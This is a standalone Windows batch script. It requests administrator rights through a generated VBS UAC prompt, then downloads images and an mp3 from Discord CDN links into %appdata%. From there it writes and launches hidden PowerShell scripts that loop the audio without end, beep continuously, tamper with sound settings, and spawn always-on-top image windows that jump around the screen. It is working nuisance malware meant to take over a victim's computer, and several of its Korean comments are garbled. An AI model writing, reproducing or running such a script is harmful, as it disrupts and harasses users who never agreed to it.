
@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '"
cd %appdata%
del /F /Q ren
md ren
cd %appdata%\ren\
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1105092370803998840/choda4_1.png "%appdata%\ren\1.png"
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1105092371055661066/choda3_1.png "%appdata%\ren\2.png"
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1105092371470888990/choda2_1.png "%appdata%\ren\3.png"
bitsadmin.exe /transfer "smile Download" https://cdn.discordapp.com/attachments/1049686998044135506/1105092371789660160/choda_1.png "%appdata%\ren\4.png"
bitsadmin.exe /transfer "Download" https://cdn.discordapp.com/attachments/1049686998044135506/1105412494173941781/f858ef12ddabaa7f.mp3 "%appdata%\ren\BEBEBEBEB.mp3"
echo cd %appdata%\ren\ > changreset.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> changreset.bat
set "eeaa=%appdata%\ren\benben.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%eeaa%'" >> changreset.bat

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo # 폼 생성                                                                                                               >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo # 폼 배경색을 투명색으로 변경                                                                                                    >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo # 폼 배경을 투명하게 만듦                                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo # 미디어 플레이어 생성                                                                                                        >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\BEBEBEBEB.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo # WPF 호스팅을 위한 WindowsFormsHost 컨트롤 생성                                                                                >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo # 미디어 플레이어 컨트롤 생성                                                                                                    >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo # WindowsFormsHost에 미디어 플레이어 컨트롤 추가                                                                                  >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo # 폼에 WindowsFormsHost 컨트롤 추가                                                                                         >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo # 폼 실행                                                                                                               >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo # PowerShell 창이 꺼지지 않도록 한다                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1
echo     # 誘몃뵒???뚮젅?댁뼱媛 醫낅즺?섎㈃ ?ㅼ떆 ?ъ깮?쒕떎                                                                      >> benben.ps1                   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo     Start-Sleep -Milliseconds 100                                                                                    >> benben.ps1
echo }                                                                                                                    >> benben.ps1

setlocal enabledelayedexpansion
for /f "tokens=2 delims==" %%a in ('wmic path win32_volumecontrolleddevice get name /value') do (
  set "device=%%a"
  set "device=!device: =!"
  set "device=!device:,=!"
  set "device=!device:&=!"
  set "device=!device:(=!"
  set "device=!device:)=!"
  if "!device:~0,1!"=="\\" (
    echo Setting volume for !device!...
    SndVol.exe -f 0x1ffffff -s !device!
  )
)
reg add "HKCU\Control Panel\Sound" /v Beep /t REG_SZ /d "yes" /f
reg add "HKCU\Control Panel\Sound" /v ExtendedSounds /t REG_SZ /d "yes" /f
reg add "HKCU\Control Panel\Sound" /v BeepSuppressionEnabled /t REG_DWORD /d 0 /f
cd %appdata%\ren\
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > beb.bat
echo powershell.exe -command "& { while ($true) { [System.Console]::Beep(32767, 32767) } }"                                        >> beb.bat
echo Add-Type -AssemblyName System.Windows.Forms                                                                                       >> imangry.ps1
echo Add-Type -AssemblyName System.Drawing                                                                                             >> imangry.ps1
echo while($true) {                                                                                                                    >> imangry.ps1
echo     $imgPath = "$env:APPDATA\ren\4.png"                                                                                      >> imangry.ps1
echo     $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                      >> imangry.ps1
echo     $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::AutoSize                                                    >> imangry.ps1
echo     $pictureBox.Image = [System.Drawing.Image]::FromFile($imgPath)                                                                >> imangry.ps1
echo     $form = New-Object System.Windows.Forms.Form                                                                                  >> imangry.ps1
echo     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                          >> imangry.ps1
echo     $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual                                                        >> imangry.ps1
echo     $form.Size = New-Object System.Drawing.Size(550, 435)                                                                         >> imangry.ps1
echo     $form.Controls.Add($pictureBox)                                                                                               >> imangry.ps1
echo     $form.TopMost = $true                                                                                                         >> imangry.ps1
echo     $form.Show()                                                                                                                  >> imangry.ps1
echo     while($form.Visible) {                                                                                                        >> imangry.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)     >> imangry.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height)    >> imangry.ps1
echo         Start-Sleep -Milliseconds 50                                                                                         >> imangry.ps1
echo     }                                                                                                                             >> imangry.ps1
echo }                                                                                                                                 >> imangry.ps1

echo Add-Type -AssemblyName System.Windows.Forms                                                                                        > 1.ps1                                                          
echo Add-Type -AssemblyName System.Drawing                                                                                              >> 1.ps1
echo while($true) {                                                                                                                     >> 1.ps1
echo     $imgPath = "$env:APPDATA\ren\1.png"                                                                                         >> 1.ps1
echo     $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                       >> 1.ps1
echo     $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::AutoSize                                                     >> 1.ps1
echo     $pictureBox.Image = [System.Drawing.Image]::FromFile($imgPath)                                                                 >> 1.ps1
echo     $form = New-Object System.Windows.Forms.Form                                                                                   >> 1.ps1
echo     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                           >> 1.ps1
echo     $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual                                                         >> 1.ps1
echo     $form.Size = New-Object System.Drawing.Size(550, 430)                                                                          >> 1.ps1
echo     $form.Controls.Add($pictureBox)                                                                                                >> 1.ps1
echo     $form.TopMost = $true                                                                                                          >> 1.ps1
echo     $form.Show()                                                                                                                   >> 1.ps1
echo     while($form.Visible) {                                                                                                         >> 1.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)      >> 1.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height)     >> 1.ps1
echo         Start-Sleep -Milliseconds 50                                                                                             >> 1.ps1
echo     }                                                                                                                              >> 1.ps1
echo }                                                                                                                                  >> 1.ps1

echo Add-Type -AssemblyName System.Windows.Forms                                                                                              >> 2.ps1                                                    
echo Add-Type -AssemblyName System.Drawing                                                                                                    >> 2.ps1
echo while($true) {                                                                                                                           >> 2.ps1
echo     $imgPath = "$env:APPDATA\ren\2.png"                                                                                               >> 2.ps1
echo     $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                             >> 2.ps1
echo     $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::AutoSize                                                           >> 2.ps1
echo     $pictureBox.Image = [System.Drawing.Image]::FromFile($imgPath)                                                                       >> 2.ps1
echo     $form = New-Object System.Windows.Forms.Form                                                                                         >> 2.ps1
echo     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                                 >> 2.ps1
echo     $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual                                                               >> 2.ps1
echo     $form.Size = New-Object System.Drawing.Size(530, 350)                                                                                >> 2.ps1
echo     $form.Controls.Add($pictureBox)                                                                                                      >> 2.ps1
echo     $form.TopMost = $true                                                                                                                >> 2.ps1
echo     $form.Show()                                                                                                                         >> 2.ps1
echo     while($form.Visible) {                                                                                                               >> 2.ps1
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)            >> 2.ps1
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height)           >> 2.ps1
echo         Start-Sleep -Milliseconds 50                                                                                                    >> 2.ps1
echo     }                                                                                                                                    >> 2.ps1
echo }                                                                                                                                        >> 2.ps1

echo Add-Type -AssemblyName System.Windows.Forms                                                                                     >> 3.ps1                                                             
echo Add-Type -AssemblyName System.Drawing                                                                                           >> 3.ps1  
echo while($true) {                                                                                                                  >> 3.ps1  
echo     $imgPath = "$env:APPDATA\ren\3.png"                                                                                      >> 3.ps1
echo     $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                    >> 3.ps1  
echo     $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::AutoSize                                                  >> 3.ps1  
echo     $pictureBox.Image = [System.Drawing.Image]::FromFile($imgPath)                                                              >> 3.ps1  
echo     $form = New-Object System.Windows.Forms.Form                                                                                >> 3.ps1  
echo     $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None                                                        >> 3.ps1  
echo     $form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual                                                      >> 3.ps1  
echo     $form.Size = New-Object System.Drawing.Size(550, 477)                                                                       >> 3.ps1  
echo     $form.Controls.Add($pictureBox)                                                                                             >> 3.ps1  
echo     $form.TopMost = $true                                                                                                       >> 3.ps1  
echo     $form.Show()                                                                                                                >> 3.ps1  
echo     while($form.Visible) {                                                                                                      >> 3.ps1  
echo         $form.Left = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width - $form.Width)   >> 3.ps1  
echo         $form.Top = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height - $form.Height)  >> 3.ps1  
echo         Start-Sleep -Milliseconds 50                                                                                           >> 3.ps1
echo     }                                                                                                                           >> 3.ps1  
echo }                                                                                                                               >> 3.ps1

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > imangry1000.bat
set "e=%appdata%\ren\imangry.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> imangry1000.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > 1.bat
set "e=%appdata%\ren\1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> 1.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > 2.bat
set "e=%appdata%\ren\2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> 2.bat

echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > 3.bat
set "e=%appdata%\ren\3.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%e%'" >> 3.bat
start /min beb.bat
start /min 3.bat
start /min 2.bat
start /min 1.bat
start /min imangry1000.bat
start /min 3.bat
start /min 2.bat
start /min 1.bat
start /min imangry1000.bat
start /min changreset.bat